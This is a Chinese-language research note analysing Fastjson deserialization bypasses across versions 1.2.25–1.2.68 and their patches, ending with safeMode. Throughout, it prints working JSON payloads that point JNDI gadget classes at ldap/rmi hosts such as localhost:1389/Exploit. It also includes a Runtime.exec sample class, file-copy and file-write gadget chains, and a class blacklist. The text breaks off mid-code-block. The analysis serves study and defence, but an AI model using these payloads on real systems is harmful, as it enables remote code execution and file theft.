# FastJson 1.2.25
`FastJson`在1.2.25中，还用之前的payload 会爆出 `autoType is not support. com.sun.rowset.JdbcRowSetImpl`
![[Pasted image 20251225152122.png]]
## 修复点

在 `DefaultJSONParser`类中
原本是下面这个样子，直接匹配到 `@type`就会进行loadClass
![[Pasted image 20251225152510.png]]
但是在1.2.25中
这里的loadclass变成了 `checkAutoType`进去看看
![[Pasted image 20251225152617.png]]


```java
public Class<?> checkAutoType(String typeName, Class<?> expectClass) {  
    if (typeName == null) {  
        return null;  
    }  
  
    final String className = typeName.replace('$', '.');  
  
    if (autoTypeSupport || expectClass != null) {  
        for (int i = 0; i < acceptList.length; ++i) {  
            String accept = acceptList[i];  
            if (className.startsWith(accept)) {  
                return TypeUtils.loadClass(typeName, defaultClassLoader);  
            }  
        }  
  
        for (int i = 0; i < denyList.length; ++i) {  
            String deny = denyList[i];  
            if (className.startsWith(deny)) {  
                throw new JSONException("autoType is not support. " + typeName);  
            }  
        }  
    }  
  
    Class<?> clazz = TypeUtils.getClassFromMapping(typeName);  
    if (clazz == null) {  
        clazz = deserializers.findClass(typeName);  
    }  
  
    if (clazz != null) {  
        if (expectClass != null && !expectClass.isAssignableFrom(clazz)) {  
            throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());  
        }  
  
        return clazz;  
    }  
  
    if (!autoTypeSupport) {  
        for (int i = 0; i < denyList.length; ++i) {  
            String deny = denyList[i];  
            if (className.startsWith(deny)) {  
                throw new JSONException("autoType is not support. " + typeName);  
            }  
        }  
        for (int i = 0; i < acceptList.length; ++i) {  
            String accept = acceptList[i];  
            if (className.startsWith(accept)) {  
                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);  
  
                if (expectClass != null && expectClass.isAssignableFrom(clazz)) {  
                    throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());  
                }  
                return clazz;  
            }  
        }  
    }  
  
    if (autoTypeSupport || expectClass != null) {  
        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);  
    }  
  
    if (clazz != null) {  
  
        if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger  
                || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver  
                ) {  
            throw new JSONException("autoType is not support. " + typeName);  
        }  
  
        if (expectClass != null) {  
            if (expectClass.isAssignableFrom(clazz)) {  
                return clazz;  
            } else {  
                throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());  
            }  
        }  
    }  
  
    if (!autoTypeSupport) {  
        throw new JSONException("autoType is not support. " + typeName);  
    }  
  
    return clazz;  
}
```

黑名单如下
```java
bsh
com.mchange
com.sun.
java.lang.Thread
java.net.Socket
java.rmi
javax.xml
org.apache.bcel
org.apache.commons.beanutils
org.apache.commons.collections.Transformer
org.apache.commons.collections.functors
org.apache.commons.collections4.comparators
org.apache.commons.fileupload
org.apache.myfaces.context.servlet
org.apache.tomcat
org.apache.wicket.util
org.codehaus.groovy.runtime
org.hibernate
org.jboss
org.mozilla.javascript
org.python.core
org.springframework
```
通过调试我们可以发现，当我们 `autoTypeSupport`为false的时候，匹配到我们要加载的类是com.sun中的于是抛出异常
![[Pasted image 20251225160626.png]]




但是从刚刚的代码来看, 如果开启了`autoType`, 则会先判断类名是否在白名单中, 如果在, 就使用`TypeUtils.loadClass`加载; 不然的话则会使用黑名单判断类名的开头, 如果匹配就抛出异常.



如果未开启`autoType`, 则会先使用黑名单匹配, 再使用白名单匹配和加载. 最后如果要反序列化的类和黑白名单都未匹配时, 只有开启了`autoType`或者`expectClass`不为空, 也就是指定了`Class`对象时才会调用`TypeUtils.loadClass`加载.

接着跟进`TypeUtils.loadClass`方法, 此方法中出现了逻辑漏洞, 这个类在加载目标类之前为了兼容带有描述符的类名, 使用了递归调用来处理描述符中的`[`、`L`、`;`字符, 而攻击者可以使用带有描述符的类绕过黑名单的限制, 并且在类加载过程中, 描述符还会被处理掉. 
![[Pasted image 20251225172917.png]]

因此, 漏洞利用的思路为: 需要开启`autoType`, 使用`[`、`L`、`;`字符来进行黑名单的绕过.
### autoTypeSupport

autoTypeSupport是`checkAutoType()`函数出现后ParserConfig.java中新增的一个配置选项，在`checkAutoType()`函数的某些代码逻辑起到开关的作用。

默认情况下autoTypeSupport为False，将其设置为True有两种方法：

- JVM启动参数：`-Dfastjson.parser.autoTypeSupport=true`
- 代码中设置：`ParserConfig.getGlobalInstance().setAutoTypeSupport(true);`，如果有使用非全局ParserConfig则用另外调用`setAutoTypeSupport(true);`

AutoType白名单设置方法：

1. JVM启动参数：`-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.`
2. 代码中设置：`ParserConfig.getGlobalInstance().addAccept("com.xx.a");`
3. 通过fastjson.properties文件配置。在1.2.25/1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：`fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.`
### POC
通过在类名的前后加上 `L`和 `;`来进行绕过
```json
{
	"@type":"Lcom.sun.rowset.JdbcRowSetImpl;",
	"dataSourceName":"ldap://127.0.0.1:8888/evilObject",
	"autoCommit":true
}
```

# Fastjson 1.2.42
## 分析

在版本`Fastjson 1.2.42`中, `fastjson`继续延续了黑白名单的检测模式, 但是为了防止安全研究人员根据黑名单中的类进行反向研究, 将黑名单类从白名单修改为使用`HASH`的方式进行对比, 用来对未更新的历史版本进行攻击. 同时, 作者对之前版本一直存在的使用类描述符绕过黑名单校验的问题尝试进行了修复.

`com.alibaba.fastjson.parser.ParserConfig`将原本的明文黑名单转为使用了`Hash`黑名单. 并且在`checkAutoType`中加入判断, 如果类的第一个字符是`L`结尾是`;`, 则使用`substring`进行了去除. 但是, 在最后处理时是递归处理, 因此只要对描述符进行双写即可绕过.
![[Pasted image 20251225181024.png]]
[https://github.com/LeadroyaL/fastjson-blacklist](https://github.com/LeadroyaL/fastjson-blacklist)（这里包含了已知跑出来的黑名单）
## Poc

```java
{
	"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
	"dataSourceName":"ldap://127.0.0.1:8888/evilObject",
	"autoCommit":true
}
```
# Fastjson 1.2.43
## 分析
这个版本主要是修复上一个版本中双写绕过的问题.

```java
if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
    if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) {
        throw new JSONException("autoType is not support. " + typeName);
    }

    className = className.substring(1, className.length() - 1);
}
```

从代码中可以看到, 用来检查的`checkAutoType`代码添加了判断, 如果类名连续出现了两个`L`将会抛出异常. 这样使用`L`、`;`绕过黑名单的思路就被阻挡了, 但是在`loadClass`的过程中, 还针对`[`也进行了处理和递归, 因此依旧可以进行绕过.

注意：在反序列化中，调用了`DefaultJSONParser.parseArray()`函数来解析数组内容，其中会有一些if判断语句校验后面的字符内容是否为”`[`“、”`{`“等
### payload

```java
{
    "@type":"[com.sun.rowset.JdbcRowSetImpl"[{,
    "dataSourceName":"ldap://127.0.0.1:8888/evilObject",
	"autoCommit":true
}
```
# Fastjson 1.2.44
## 分析
这个版本主要是修复上一个版本中使用`[`绕过黑名单防护的问题. 

```java
long BASIC = -3750763034362895579L;
long PRIME = 1099511628211L;
long h1 = (-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L;
if (h1 == -5808493101479473382L) {
    throw new JSONException("autoType is not support. " + typeName);
} else if ((h1 ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
    throw new JSONException("autoType is not support. " + typeName);
}
```

从代码中可以看到, 在`checkAutoType`中添加了新的判断, 如果类名以`[`开始则直接抛出异常. 因此, 由字符串处理导致的黑名单绕过也就告一段落了.
# Fastjson 1.2.45
**前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列<3.5.0的版本。**
```xml
<dependency>
    <groupId>org.mybatis</groupId>
    <artifactId>mybatis</artifactId>
    <version>3.5.13</version> 
</dependency>
```
## 分析
主要就是找到了一个可利用的不在黑名单的类，这个类我们在哈希黑名单中1.2.46的版本中可以看到：


|version|hash|hex-hash|name|
|---|---|---|---|
|1.2.46|-8083514888460375884|0x8fd1960988bce8b4L|org.apache.ibatis.datasource|
org.apache.ibatis.datasource.jndi.JndiDataSourceFactory”不在黑名单中，因此能成功绕过`checkAutoType()`函数的检测。

继续往下调试分析org.apache.ibatis.datasource.jndi.JndiDataSourceFactory这条利用链的原理。

由于payload中设置了properties属性值，且`JndiDataSourceFactory.setProperties()`方法满足之前说的Fastjson会自动调用的`setter`方法的条件，因此可被利用来进行Fastjson反序列化漏洞的利用。

直接在该setter方法打断点，可以看到会调用到这来，这里就是熟悉的JNDI注入漏洞了，即`InitialContext.lookup()`，其中参数由我们输入的properties属性中的data_source值获取的：


## payload
（RMI也能打）

```java
{	
	"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties":{
        "data_source":"ldap://127.0.0.1:8888/evilObject"
    }
}
```


```java
import com.alibaba.fastjson.JSON;  
import com.alibaba.fastjson.parser.ParserConfig;  
  
// Fastjson 1.2.41 版本的绕过  
public class SuccessBypassEXP_45 {  
    public static void main(String[] args) {  
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  
 String payload ="{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\"," +  
                "\"properties\":{\"data_source\":\"ldap://localhost:1234/Exploit\"}}";  
 JSON.parse(payload);  
 }  
}
```

# Fastjson 1.2.47

## 分析
这个版本挖出的洞就比较通吃了，可以说不限定于1.2.47,每个版本的利用区别后面再说，总之比较牛逼，属于`checkAutoType()`函数本身在编写的时候，开发者所留下来的漏洞 

先来看看这个关键的`checkAutoType()`函数源码写的逻辑
![[checkAutoType()思维导图 1.png]]

其中 `TypeUtils.getClassFromMapping()`会返回一个mappings.get()
![[Pasted image 20251226133049.png]]
那我们就思考mappings这个属性在哪里赋值，这个mappings我们可不可控
![[Pasted image 20251226133254.png]]![[Pasted image 20251226133303.png]]
其中可以看到 有可能可控赋值的地方就是  `loadClass()`这里的几个方法
那我们去找哪里调用了`loadClass()`就可以了
最终我们找到了这里

![[Pasted image 20251226135329.png]]

```java

public class MiscCodec implements ObjectSerializer, ObjectDeserializer {  
    private static      boolean   FILE_RELATIVE_PATH_SUPPORT = false;  
    public final static MiscCodec instance                   = new MiscCodec();  
    private static      Method    method_paths_get;  
    private static      boolean   method_paths_get_error     = false;
    
    ........
    
    
    
		if (clazz == Class.class) {  
		return(T)TypeUtils.loadClass(strVal,parser.getConfig().getDefaultClassLoader());  
}
```

我们发现他继承了 `ObjectSerializer, ObjectDeserializer`
所以我们可以知道他是一个反序列化或者序列化器
并且我们可以在之前发现初始化反序列化器的时候会加载一些默认的
![[Pasted image 20251226140131.png]]
![[Pasted image 20251226140158.png]]
重点在这里

![[Pasted image 20251226140312.png]]


当我们Class类反序列化的时候，就会调用 `MiscCodec`这个反序列化器，=
可以看到当类为 `Class`的时候，他就会调用loadClass 把我们传入的字符串当作类名来加载
![[Pasted image 20251226143847.png]]

并且在这个loadClass中还会把我们的类放在缓存中
![[Pasted image 20251226144043.png]]
当我们在缓存中找到这个类的时候，就会return，
![[Pasted image 20251226144310.png]]


## payload
这里的前提是没有打开 `AutoTypeSupport`
fastjson中，当字段为val的时候，他会被当作参数传入当前类的的类加载过程中

```json
{
	"demo1": {
		"@type": "java.lang.Class",
		"val": "com.sun.rowset.JdbcRowSetImpl"
	},
	"demo2": {
		"@type": "com.sun.rowset.JdbcRowSetImpl",
		"dataSourceName":"ldap://127.0.0.1:8085/FaDYrEDb",
		"autoCommit": true
	}
}
```
可以看到直接return class了
![[Pasted image 20251226152748.png]]
![[Pasted image 20251226152857.png]]![[Pasted image 20251226152551.png]]

当打开 `AutoTypeSupport`的时候我们会发现他还是会走到
判断开头是不是`L`结尾是不是 `;`那块的逻辑，所以我们可以接着用 原来的方法

```json
{
	"demo1": {
		"@type": "java.lang.Class",
		"val": "com.sun.rowset.JdbcRowSetImpl"
	},
	"demo2": {
		"@type": "Lcom.sun.rowset.JdbcRowSetImpl;",
		"dataSourceName":"ldap://127.0.0.1:8085/FaDYrEDb",
		"autoCommit": true
	}
}

---------------------------------------------------------------------------------

{
	"demo1": {
		"@type": "java.lang.Class",
		"val": "com.sun.rowset.JdbcRowSetImpl"
	},
	"demo2": {
		"@type": "[com.sun.rowset.JdbcRowSetImpl"[{,
		"dataSourceName":"ldap://127.0.0.1:8085/FaDYrEDb",
		"autoCommit": true
	}
}
```
这两种在开启 `AutoTypeSupport`的时候都是可用的

![[Pasted image 20251226153828.png]]

### 总结
- 1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport需要稍微修改通过之前的方式绕过；
- 1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；
# 后续版本补丁分析

由于1.2.47这个洞能够在不开启AutoTypeSupport实现RCE，因此危害十分巨大，看看是怎样修的。1.2.48中的修复措施是，在`loadClass()`时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将Class类加入到了黑名单中。

调试分析，在调用TypeUtils.loadClass()时中，缓存开关cache默认设置为了False，对比下两个版本的就知道了。

1.2.48版本：
![[Pasted image 20251226154425.png]]


1.2.47版本：
![[Pasted image 20251226154434.png]]


导致目标类并不能缓存到Map中了：
![[Pasted image 20251226154441.png]]


因此，即使未开启AutoTypeSupport，但com.sun.rowset.JdbcRowSetImpl类并未缓存到Map中，就不能和前面一样调用`TypeUtils.getClassFromMapping()`来加载了，只能进入后面的代码逻辑进行黑白名单校验被过滤掉：
![[Pasted image 20251226154449.png]]


# Fastjson <= 1.2.61 通杀
### Fastjson1.2.5 <= 1.2.59

**需要开启AutoType**

```json
{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}
{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}
```
### Fastjson1.2.5 <= 1.2.60

**需要开启 autoType：**
```json
{"@type":"oracle.jdbc.connector.OracleManagedConnectionFactory","xaDataSourceName":"rmi://10.10.20.166:1099/ExportObject"}

{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"ldap://10.10.20.166:1389/ExportObject"}
```
### Fastjson1.2.5 <= 1.2.61

```json
{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://localhost:1389/Exploi
```
[Java反序列化Fastjson篇03-Fastjson各版本绕过分析 | Drunkbaby's Blog](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/)


# Fastjson1.2.62 

 - 需要开启AutoType；
- Fastjson <= 1.2.62；
- JNDI注入利用所受的JDK版本限制；
- 目标服务端需要存在xbean-reflect包；xbean-reflect 包的版本不限
```xml
<dependencies>

<dependency>  
 <groupId>com.alibaba</groupId>  
 <artifactId>fastjson</artifactId>  
 <version>1.2.62</version>  
</dependency>  
<dependency>  
 <groupId>org.apache.xbean</groupId>  
 <artifactId>xbean-reflect</artifactId>  
 <version>4.18</version>  
</dependency>  
<dependency>  
 <groupId>commons-collections</groupId>  
 <artifactId>commons-collections</artifactId>  
 <version>3.2.1</version>  
</dependency>
</dependencies>
```

## 分析
漏洞主要出现在 `org.apache.xbean.propertyeditor.JneeeeediConverter `这个类中，这个类中的
很明显的 `jndi` 
![[Pasted image 20251226160033.png]]现在问题就是这个方法并不是经典 `javabean` 那我们得想办法反序列化的时候调用它。
我们两个思路，一个思路是查找谁调用了这个类的 `toObjectImpl`方法，
另一个是，我们发现这是 `AbstractConverter`的子类，在类加载的时候我们知道
如果一个子类要加载，JVM会先去找他的父类是否加载，会先执行父类的静态变量赋值和静态代码块，然后初始化子类

虽然我们发现这个父类是一个 抽象类，但其中的 `setAsText`却是一个public的方法
那么就满足一切需求。

我们以子类 `JndiConverter`为入口，使用它父类中的 `AbstractConverter.setAsText()`来执行子类中的 `toObject()`然后触发jndi注入。

## payload
```json
{
"@type":"org.apache.xbean.propertyeditor.JndiConverter", 
"AsText":"ldap://127.0.0.1:1234/ExportObject"
}
```


# Fastjson1.2.66
- 开启AutoType；
- Fastjson <= 1.2.66；
- JNDI注入利用所受的JDK版本限制；
- org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；
- br.com.anteros.dbcp.AnterosDBCPConfig 类需要 Anteros-Core和 Anteros-DBCP 包；
- com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；

这个版本还是找到了新的利用链，不是绕过的手法，所以直接粘poc吧

```json
{
"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", 
"jndiNames":["ldap://localhost:1389/Exploit"], 
"Realms":[""]
}
```

```json
{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig",
"metricRegistry":"ldap://localhost:1389/Exploit"
}


或

{
"@type":"br.com.anteros.dbcp.AnterosDBCPConfig",
"healthCheckRegistry":"ldap://localhost:1389/Exploit"
}
```

```json
{
    "@type": "com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig",
    "properties": {
        "@type": "java.util.Properties",
        "UserTransaction": "ldap://127.0.0.1:1389/Exploit"
    }
}
```

# Fastjson1.2.67（黑名单绕过）
- 开启AutoType；
- Fastjson <= 1.2.67；
- JNDI注入利用所受的JDK版本限制；
- org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；
- org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；

org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类PoC：
```json
{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup", "jndiNames":["ldap://localhost:1389/Exploit"], "tm": {"$ref":"$.tm"}}
```

org.apache.shiro.jndi.JndiObjectFactory类PoC：

```json
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://localhost:1389/Exploit","instance":{"$ref":"$.instance"}}
```



#  Fastjson1.2.67（expectClass绕过AutoType）

- Fastjson <= 1.2.68；
- 利用类必须是expectClass类的子类或实现类，并且不在黑名单中；

白名单逻辑中，如果调用者显式传入了 `expectClass` 参数，Fastjson 会认为：“既然你已经指定了要加载某个特定类型（比如 `AutoCloseable`）的实现，那我就信任这个范围内类”。
我们发现，先触发加载一个类作为 `expectClass`，然后在同一个解析过程中，再传入该类的子类。此时，子类会因为符合“属于 `expectClass` 派生类”的条件而**直接跳过黑名单检查**。
## 分析
我们打断点进去看一下过程
可以看到这个递归调用，先识别到了我们传入的 `expectClass`是一个接口，并且构造了他的反序列化器，然后把接口当作参数，进行下一轮的递归调用
![[Pasted image 20251226221000.png]]
![[Pasted image 20251226220957.png]]


可以看到这里已经把 `java.lang.AutoCloseable`当作 `expectClass`传入  `checkAutoType()`了
![[Pasted image 20251226221450.png]]
`expectClassFlag = true;`

![[Pasted image 20251226221736.png]]
由于`expectClassFlag = true;`
所以进入了这个if逻辑中，进行白名单检查，白名单检查我们肯定是不在里面的对吧，并且，我们自己写的这个类肯定也不在黑名单里，肯定也不会直接抛出异常，但这个地方最后没有走到return class
![[Pasted image 20251226221836.png]]
下面还有一段类似的逻辑，如过没开启 `autoTypeSupport`都会进入这段逻辑
但和刚刚的一样，不在黑也不在白名单，无事发生....
```java
  
if (!autoTypeSupport) {  
    long hash = h3;  
    for (int i = 3; i < className.length(); ++i) {  
        char c = className.charAt(i);  
        hash ^= c;  
        hash *= PRIME;  
  
        if (Arrays.binarySearch(denyHashCodes, hash) >= 0) {  
            throw new JSONException("autoType is not support. " + typeName);  
        }  
  
        // white list  
        if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {  
            if (clazz == null) {  
                clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true);  
            }  
  
            if (expectClass != null && expectClass.isAssignableFrom(clazz)) {  
                throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());  
            }  
  
            return clazz;  
        }  
    }  
}
```
这里由于有 `expectClassFlag`所以进来进行 `loadClass`注意这里的 `cacheClass=flase`不会加载到缓存中。
![[Pasted image 20251226223618.png]]
上面，进行一系列安全检查，如果不符合，就抛异常

下面到了最关键的地方，他调用了 `isAssignableFrom()`我们进去看看是干嘛的
![[Pasted image 20251226224328.png]]
从注释中我们也可以发现，这是用来判断，如果是一个接口的实现类那么为true，否则为false
ok我们正好满足
![[Pasted image 20251226224245.png]]
直接进入并且return class，至此大功告成了，接着就是原本那套，把class返回，构造deserializer，返回，进行反序列化。


## payload

简单地验证利用expectClass绕过的可行性，先假设Fastjson服务端存在如下实现AutoCloseable接口类的恶意类VulAutoCloseable：

```java
public class VulAutoCloseable implements AutoCloseable {
    public VulAutoCloseable(String cmd) {
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
 
    @Override
    public void close() throws Exception {
 
    }
}
```

构造PoC如下：

```json
{"@type":"java.lang.AutoCloseable","@type":"org.example.VulAutoCloseable","cmd":"calc"}
```

无需开启AutoType，直接成功绕过`CheckAutoType()`的检测从而触发执行：
![[Pasted image 20251226220046.png]]


## 小总结
第一个 `@type` 进去什么都没有发生；但是第一个 `@type` 是作为第二个指定的类里面的 expectClass。所以说白了，loadClass 去作用的类是第一个 `@type`；如果这个 `@type` 是可控的恶意类，可以造成命令执行攻击。

也就是说，我们需要要目标服务器找到一组危险的父子类或者一组危险的接口和实现，并且他们不能在黑名单中，即可执行危险代码。


## 寻找可用类
这里的难点就不是怎么绕过FastJson来进行反序列化，真正的难点是在于怎么找到一个危险的父子类或者接口和实现类，来进行恶意代码执行。

这里直接参考[b1ue大佬文章](https://b1ue.cn/archives/364.html)，主要是寻找关于输入输出流的类来写文件，IntputStream和OutputStream都是实现自AutoCloseable接口的。

> 我寻找 gadget 时的条件是这样的。
> 
> - 需要一个通过 set 方法或构造方法指定文件路径的 OutputStream
> - 需要一个通过 set 方法或构造方法传入字节数据的 OutputStream，参数类型必须是byte[]、ByteBuffer、String、char[]其中的一个，并且可以通过 set 方法或构造方法传入一个 OutputStream，最后可以通过 write 方法将传入的字节码 write 到传入的 OutputStream
> - 需要一个通过 set 方法或构造方法传入一个 OutputStream，并且可以通过调用 toString、hashCode、get、set、构造方法 调用传入的 OutputStream 的 close、write 或 flush 方法
> 
> 以上三个组合在一起就能构造成一个写文件的利用链，我通过扫描了一下 JDK ，找到了符合第一个和第三个条件的类。
> 
> 分别是 FileOutputStream 和 ObjectOutputStream，但这两个类选取的构造器，不符合情况，所以只能找到这两个类的子类，或者功能相同的类。

#### 复制文件（任意文件读取漏洞）

利用类：**org.eclipse.core.internal.localstore.SafeFileOutputStream**

依赖：
```xml
<dependency>  
 <groupId>org.aspectj</groupId>  
 <artifactId>aspectjtools</artifactId>  
 <version>1.9.5</version>  
</dependency>
```

看下SafeFileOutputStream类的源码，其`SafeFileOutputStream(java.lang.String, java.lang.String)`构造函数判断了如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中，正是利用其构造函数的这个特点来实现Web场景下的任意文件读取：
```java
public SafeFileOutputStream(String targetPath, String tempPath) throws IOException {  
//如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中
    this.failed = false;  
    this.target = new File(targetPath);  
    this.createTempFile(tempPath);  
    if (!this.target.exists()) {  
        if (!this.temp.exists()) {  
            this.output = new BufferedOutputStream(new FileOutputStream(this.target));  
            return;  
        }  
  
        this.copy(this.temp, this.target);  
    }  
  
    this.output = new BufferedOutputStream(new FileOutputStream(this.temp));  
}
```

#### 写入文件

写内容类：**com.esotericsoftware.kryo.io.Output**

依赖：
```xml
<dependency>
    <groupId>com.esotericsoftware</groupId>
    <artifactId>kryo</artifactId>
    <version>4.0.0</version>
</dependency>
```
Output类主要用来写内容，它提供了`setBuffer()`和`setOutputStream()`两个setter方法可以用来写入输入流，其中buffer参数值是文件内容，outputStream参数值就是前面的SafeFileOutputStream类对象，而要触发写文件操作则需要调用其`flush()`函数：

```java
/** Sets a new OutputStream. The position and total are reset, discarding any buffered bytes.
 * @param outputStream May be null. */
public void setOutputStream (OutputStream outputStream) {
    this.outputStream = outputStream;
    position = 0;
    total = 0;
}
 
...
 
/** Sets the buffer that will be written to. {@link #setBuffer(byte[], int)} is called with the specified buffer's length as the
 * maxBufferSize. */
public void setBuffer (byte[] buffer) {
    setBuffer(buffer, buffer.length);
}
 
...
 
/** Writes the buffered bytes to the underlying OutputStream, if any. */
public void flush () throws KryoException {
    if (outputStream == null) return;
    try {
        outputStream.write(buffer, 0, position);
        outputStream.flush();
    } catch (IOException ex) {
        throw new KryoException(ex);
    }
    total += position;
    position = 0;
}
 
...
```

如果可以写入文件的话，我们这里可以写入一些恶意文件。

接着，就是要看怎么触发Output类`flush()`函数了，`flush()`函数只有在`close()`和`require()`函数被调用时才会触发，其中`require()`函数在调用write相关函数时会被触发。这也是链子的思维

其中，找到JDK的ObjectOutputStream类，其内部类BlockDataOutputStream的构造函数中将OutputStream类型参数赋值给out成员变量，而其`setBlockDataMode()`函数中调用了`drain()`函数、`drain()`函数中又调用了`out.write()`函数，满足前面的需求：

```java
/**  
 * Creates new BlockDataOutputStream on top of given underlying stream.  
 * Block data mode is turned off by default.  
 */  
 BlockDataOutputStream(OutputStream out) {  
 this.out = out;  
 dout = new DataOutputStream(this);  
 }  
  
 /**  
 * Sets block data mode to the given mode (true == on, false == off)  
 * and returns the previous mode value.  If the new mode is the same as  
 * the old mode, no action is taken.  If the new mode differs from the  
 * old mode, any buffered data is flushed before switching to the new  
 * mode.  
 */  
 boolean setBlockDataMode(boolean mode) throws IOException {  
 if (blkmode == mode) {  
 return blkmode;  
 }  
 drain();  
 blkmode = mode;  
 return !blkmode;  
 }  
  
...  
  
 /**  
 * Writes all buffered data from this stream to the underlying stream,  
 * but does not flush underlying stream.  
 */  
 void drain() throws IOException {  
 if (pos == 0) {  
 return;  
 }  
 if (blkmode) {  
 writeBlockHeader(pos);  
 }  
 out.write(buf, 0, pos);  
 pos = 0;  
 }
```
对于setBlockDataMode()函数的调用，在ObjectOutputStream类的有参构造函数中就存在：

```java
public ObjectOutputStream(OutputStream out) throws IOException {  
 verifySubclass();  
 bout = new BlockDataOutputStream(out);  
 handles = new HandleTable(10, (float) 3.00);  
 subs = new ReplaceTable(10, (float) 3.00);  
 enableOverride = false;  
 writeStreamHeader();  
 bout.setBlockDataMode(true);  
 if (extendedDebugInfo) {  
 debugInfoStack = new DebugTraceInfoStack();  
 } else {  
 debugInfoStack = null;  
 }  
}
```

但是Fastjson优先获取的是ObjectOutputStream类的无参构造函数，因此只能找ObjectOutputStream的继承类来触发了。

只有有参构造函数的ObjectOutputStream继承类：**com.sleepycat.bind.serial.SerialOutput**

依赖：

```xml
<dependency>  
 <groupId>com.sleepycat</groupId>  
 <artifactId>je</artifactId>  
 <version>5.0.73</version>  
</dependency>
```

看到，SerialOutput类的构造函数中是调用了父类ObjectOutputStream的有参构造函数，这就满足了前面的条件了：


```java
public SerialOutput(OutputStream out, ClassCatalog classCatalog)  
 throws IOException {  
  
 super(out);  
 this.classCatalog = classCatalog;  
  
 /* guarantee that we'll always use the same serialization format */  
  
 useProtocolVersion(ObjectStreamConstants.PROTOCOL_VERSION_2);  
}
```

PoC如下，用到了Fastjson循环引用的技巧来调用：

这里写入文件内容其实有限制，有的特殊字符并不能直接写入到目标文件中，比如写不进PHP代码等。

攻击利用成功。

# 后续补丁
expectClass的判断逻辑中，对类名进行了Hash处理再比较哈希黑名单，并且添加了三个类：
![[Pasted image 20251227160653.png]]

网上已经有了利用彩虹表碰撞的方式得到的新添加的三个类分别为：

|版本|十进制Hash值|十六进制Hash值|类名|
|---|---|---|---|
|1.2.69|5183404141909004468L|0x47ef269aadc650b4L|java.lang.Runnable|
|1.2.69|2980334044947851925L|0x295c4605fd1eaa95L|java.lang.Readable|
|1.2.69|-1368967840069965882L|0xed007300a7b227c6L|java.lang.AutoCloseable|

这就简单粗暴地防住了这几个类导致的绕过问题了。

# safeMode



官方参考：[https://github.com/alibaba/fastjson/wiki/fastjson_safemode](https://github.com/alibaba/fastjson/wiki/fastjson_safemode)

在1.2.68之后的版本，在1.2.68版本中，fastjson增加了safeMode的支持。safeMode打开后，完全禁用autoType。所有的安全修复版本sec10也支持SafeMode配置。

代码中设置开启SafeMode如下：
```java
ParserConfig.getGlobalInstance().setSafeMode(true);
```
开启之后，就完全禁用AutoType即`@type`了，这样就能防御住Fastjson反序列化漏洞了。

具体的处理逻辑，是放在`checkAutoType()`函数中的前面，获取是否设置了SafeMode，如果是则直接抛出异常终止运行：


# 其他
其他Gadget 并且均需要开启AutoType，且会被JNDI注入利用所受的JDK版本限制。
## 1.2.59

com.zaxxer.hikari.HikariConfig类PoC：
```json
{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}或{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}
```

### 1.2.61

org.apache.commons.proxy.provider.remoting.SessionBeanProvider类PoC：
```json
{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://localhost:1389/Exploit","Object":"a"}
```

## 1.2.62

org.apache.cocoon.components.slide.impl.JMSContentInterceptor类PoC：

```json
